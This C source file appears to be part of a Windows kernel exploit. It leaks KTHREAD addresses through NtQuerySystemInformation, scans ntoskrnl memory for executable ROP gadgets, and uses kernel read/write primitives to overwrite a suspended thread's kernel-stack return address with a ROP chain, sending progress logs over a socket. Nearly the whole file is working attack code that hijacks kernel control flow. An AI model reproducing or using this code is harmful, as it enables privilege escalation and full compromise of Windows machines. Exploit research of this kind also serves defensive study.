#include "rop.h"

#include <ntstatus.h>
#include <ctype.h>

#include "win_defs.h"
#include "ioring.h"
#include "nt_offsets.h"

#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

static dict_t g_gadgets;

// can probably just use getobjptr
UINT64 leak_kthread(HANDLE threadHandle)
{
	int ret = -1;
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
	ULONG ulBytes = 0;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	UINT64 kthreadHandle = -1;

	while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
		}

		else
		{
			pHandleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (ntStatus != STATUS_SUCCESS)
	{
		ret = -1;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) && (pHandleInfo->Handles[i].HandleValue == threadHandle))
		{
			kthreadHandle = (UINT64)pHandleInfo->Handles[i].Object;
			ret = 0;
			break;
		}
	}

done:
	if (NULL != pHandleInfo)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}
	CloseHandle(threadHandle);
	return kthreadHandle;
}


UINT64 threaderCounter = 0;
void dummy_thread() {
	while (1) { threaderCounter++; Sleep(100); }
	return;
}

HANDLE create_dummy_thread() {
	return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dummy_thread, NULL, CREATE_SUSPENDED, NULL);
}

void execute_ropchain(SOCKET sock, HANDLE thread, UINT64 ntBase, UINT64* ropChain, SIZE_T chainSize) {
	UINT64 kthreadAddress = leak_kthread(thread);
	CHAR ptr_msg[1024] = { 0 };
	UINT64 stackBaseAddress = kthreadAddress + 0x38;
	UINT64 stackBase;
	krnl_read(stackBaseAddress, &stackBase, sizeof(UINT64));

	UINT64 retAddress = 0;
	for (int i = 0x8; i < 0x7000 - 0x8; i += 0x8) {
		UINT64 value;
		krnl_read(stackBase - i, &value, sizeof(UINT64));
		if ((value & 0xfffff00000000000) == 0xfffff00000000000) {
			if (value == ntBase + 0x447db6) { // -0x858
				retAddress = stackBase - i;
				break;
			}
			/*UINT64 val;
			if (krnl_read_s(stackBase - i, &val, sizeof(UINT64)) != 0)
				continue;
			sprintf_s(ptr_msg,
				sizeof(ptr_msg),
				"[?] Thread stack [-0x%x]: 0x%llx\n", i, val-ntBase);
			sock_log(sock, ptr_msg);
			if (i > 0x900)
				break;*/
		}
	}

	sprintf_s(ptr_msg,
		sizeof(ptr_msg),
		"[?] Dummy thread counter: %i\n", threaderCounter);
	sock_log(sock, ptr_msg);

	krnl_write(retAddress, ropChain, chainSize);

	sprintf_s(ptr_msg,
		sizeof(ptr_msg),
		"[?] Dummy thread counter: %i\n", threaderCounter);
	sock_log(sock, ptr_msg);
	ResumeThread(thread);
	sprintf_s(ptr_msg,
		sizeof(ptr_msg),
		"[?] Dummy thread counter: %i\n", threaderCounter);
	sock_log(sock, ptr_msg);
}


BOOL match_gadget_sig(CHAR* buffer, CHAR* signature, SIZE_T signatureSize) {
	for (SIZE_T i = 0; i < signatureSize; i++) {
		if (buffer[i] != signature[i]) {
			return FALSE;
		}
	}
	return TRUE;
}

BOOL gadget_scan(SOCKET s, UINT64 baseAddress, UINT64 size, gadget_kv_pair* gadgets, int arraySize, dict_t dict) {
	if (baseAddress == NULL || size == 0 || gadgets == NULL || arraySize == 0)
		return NULL;

	CHAR ptr_msg[1024] = { 0 };

	CHAR* buffer = (CHAR*)malloc(size);
	if (krnl_read_s(baseAddress, buffer, size) != 0) {
		free(buffer);
		return NULL;
	}

	
	int gadgetsFound = 0;
	for (SIZE_T i = 0; i <= size - 4; i++) { // 4 is max sig size for now, it's fine if we miss some bytes (there'll be others)
		for (int i2 = 0; i2 < arraySize; i2++) {
			if (!dict_find(dict, gadgets[i2].asm, 0) && match_gadget_sig(buffer + i, gadgets[i2].bytes, gadgets[i2].size)) {
				UINT64 nothing;
				// another krnl_read is really going to slow down the scan i90ufda9ghuofsdghjafog
				MMPTE pte = get_pagetable_entry(baseAddress + i, &nothing);
				UINT64 noExec = pte.u.Hard.NoExecute;
				if (!noExec) {
					/*sprintf_s(ptr_msg,
						sizeof(ptr_msg),
						"\n[?] [%s]: 0x%llx\n", gadgets[i2].asm, baseAddress + i);
					sock_log(s, ptr_msg);*/

					dict_add(dict, gadgets[i2].asm, baseAddress + i);
					gadgetsFound++;
					if (dict->len == arraySize)
						goto end;
				}
			}
		}
	}

end:
	free(buffer);
	if (gadgetsFound == arraySize)
		return TRUE;
	return FALSE;
}

dict_t get_gadget_dict() {
	return g_gadgets;
}

// socket for debugging
dict_t scan_gadgets(SOCKET s, UINT64 ntBase) {
	
	dict_t out = dict_new();


	CHAR ptr_msg[1024] = { 0 };

	gadget_kv_pair gadgetSigs[] = {
		{ "pop rax ; ret ;", { 0x58, 0xc3 }, 2 }, // y
		{ "jmp rax ;", { 0xff, 0xe0 }, 2 }, // y
		{ "pop rcx ; ret ;", { 0x59, 0xc3 }, 2 }, // y
		{ "mov qword [rcx], rax ; ret ;", { 0x48, 0x89, 0x00, 0xc3 }, 4 }, // y
		{ "pop rdx ; ret ;", { 0x5a, 0xc3 }, 2 }, // y
		{ "ret ;", { 0xc3 }, 1 }, // y
		{ "pop r8 ; ret ;", { 0x41, 0x58, 0xc3 }, 3 },
		{ "mov qword [r8+0x08], rax ; ret ;", { 0x49, 0x89, 0x40, 0x08, 0xc3 }, 5}
	};

	sprintf_s(ptr_msg,
		sizeof(ptr_msg),
		"[?] Expected gadget count: %i\n", ARRAY_SIZE(gadgetSigs));
	sock_log(s, ptr_msg);

	ULONG len;
	/*NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(len);
	NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	
	for (int i = 2; i < pModuleInfo->NumberOfModules; i++) {
		sock_log(s, "where\n");
		if (out->len >= ARRAY_SIZE(gadgetSigs))
			break;
		sock_log(s, "here\n");

		SYSTEM_MODULE_INFORMATION_ENTRY mod = pModuleInfo->Module[i];
		sprintf_s(ptr_msg,
			sizeof(ptr_msg),
			"[mod] %s\n",
			mod.ImageName);
		sock_log(s, ptr_msg);
		
		IMAGE_DOS_HEADER dosHeader;
		if (krnl_read_s((UINT64)mod.Base, &dosHeader, sizeof(dosHeader)) != 0)
			continue;

		if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
			continue;
		sock_log(s, "dos g\n");
		IMAGE_NT_HEADERS64 ntHeaders;
		if (krnl_read_s((UINT64)mod.Base + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS64)) != 0)
			continue;
		
		if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
			continue;
		sock_log(s, "nt g\n");

		DWORD imageSize = ntHeaders.OptionalHeader.SizeOfImage;
		BYTE* pModuleBuffer = (BYTE*)VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		UINT64 base = mod.Base;
		for (int page = 0x0; page < imageSize; page += 0x1000) {
			UINT64 readAddr = base + page;
			krnl_read_s(readAddr, pModuleBuffer + page, 0x1000);
		}

		sock_log(s, "got buff\n");

		PIMAGE_SECTION_HEADER sections;
		if (krnl_read_s((UINT64)mod.Base + dosHeader.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + ntHeaders.FileHeader.SizeOfOptionalHeader, sections, ntHeaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)) != 0)
			sock_log(s, "uh oh\n");

		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBuffer;
		if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
			sprintf_s(ptr_msg,
				sizeof(ptr_msg),
				"[!] Invalid DOS Header signature: 0x%lx\n", pDosHeader->e_magic);
			sock_log(s, ptr_msg);
			VirtualFree(pModuleBuffer, imageSize, MEM_RELEASE);
			return 7;
		}

		PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(pModuleBuffer + pDosHeader->e_lfanew);
		if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
			sprintf_s(ptr_msg,
				sizeof(ptr_msg),
				"[!] Invalid NT Header signature: 0x%lx\n", pNtHeader->Signature);
			sock_log(s, ptr_msg);
			VirtualFree(pModuleBuffer, imageSize, MEM_RELEASE);
			return 8;
		}

		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeader);
		IMAGE_SECTION_HEADER textSection;
		BOOL gotCode = FALSE;
		for (WORD i2 = 0; i < ntHeaders.FileHeader.NumberOfSections; ++i2, section++) {
			if (strcmp(section->Name, ".text") == 0) {
				textSection = section[i2];
				gotCode = TRUE;
				break;
			}
		}

		/*sock_log(s, "testing seg\n");
		int codeSectionIdx = -1;
		for (int i2 = 0; i2 < ntHeaders.FileHeader.NumberOfSections; i2++) {
			sprintf_s(ptr_msg,
				sizeof(ptr_msg),
				"[seg] %s\n",
				sections[i2].Name);
			sock_log(s, ptr_msg);
			if (strcmp(sections[i2].Name, ".text") == 0) {
				sock_log(s, "found .text\n");
				codeSectionIdx = i2;
				break;
			}
		}

		BOOL res = TRUE;
		UINT64 offset = 0x0;
		do {
			sprintf_s(ptr_msg,
				sizeof(ptr_msg),
				"\r[?] Scanning for gadgets. [%s/0x%llx]",
				mod.ImageName + mod.ModuleNameOffset, (UINT64)mod.Base + textSection.VirtualAddress + offset);
			sock_log(s, ptr_msg);
			gadget_scan(s,
				(UINT64)mod.Base + textSection.VirtualAddress + offset,
				0x1000,
				gadgetSigs,
				ARRAY_SIZE(gadgetSigs),
				out);
			offset += 0x1000;
			if (offset < textSection.Misc.VirtualSize)
				break;
		} while (out->len < ARRAY_SIZE(gadgetSigs));
		free(pModuleBuffer);
	}*/
	UINT64 offset = 0x0;
	do {
		sprintf_s(ptr_msg,
			sizeof(ptr_msg),
			"\r[?] Scanning for gadgets. [0x%llx]",
			ntBase + offset);
		sock_log(s, ptr_msg);
		gadget_scan(s,
			ntBase + offset,
			0x1000,
			gadgetSigs,
			ARRAY_SIZE(gadgetSigs),
			out);
		offset += 0x1000;
		//if (offset < textSection.Misc.VirtualSize)
		//break;
	} while (out->len < ARRAY_SIZE(gadgetSigs));


	
	return out;
}